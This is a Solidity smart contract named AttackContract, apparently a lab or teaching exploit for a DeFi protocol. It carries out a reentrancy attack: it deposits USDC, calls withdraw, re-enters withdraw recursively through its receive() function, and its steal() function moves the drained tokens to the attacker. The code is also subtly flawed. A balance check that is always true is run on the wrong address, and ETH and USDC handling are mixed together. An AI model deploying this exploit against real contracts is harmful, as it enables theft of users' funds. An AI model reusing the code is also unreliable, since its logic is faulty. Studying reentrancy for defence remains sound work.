// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {IProtocol} from "../defiProtocol/interfaces/IProtocol.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract AttackContract {
    IERC20 private s_usdc;
    address private owner;

    constructor(address _usdcAddress) {
        s_usdc = IERC20(_usdcAddress);
        owner = msg.sender;
    }

    function attack(uint256 amount, address protocolAddress) public {
        IProtocol protocol = IProtocol(protocolAddress);
        // Deposits tokens to the protocol contract
        s_usdc.approve(address(protocol), amount);
        protocol.deposit(amount);

        // Run the attack to exploit re-entrency in withdraw function
        IProtocol(protocol).withdraw(amount);
    }

    // This is the function that gets called recursively by the withdraw function
    receive() external payable {
        IProtocol protocol = IProtocol(msg.sender);
        uint256 usdcBalanceOfProtocol = s_usdc.balanceOf(address(this));

        if (usdcBalanceOfProtocol >= 0) {
            protocol.withdraw(msg.value);
        }
    }

    // The owner of the contract withdraw the stolen funds
    function steal() public {
        require(msg.sender == owner, "Only attacker can call this function");
        s_usdc.transfer(msg.sender, s_usdc.balanceOf(address(this)));
    }
}
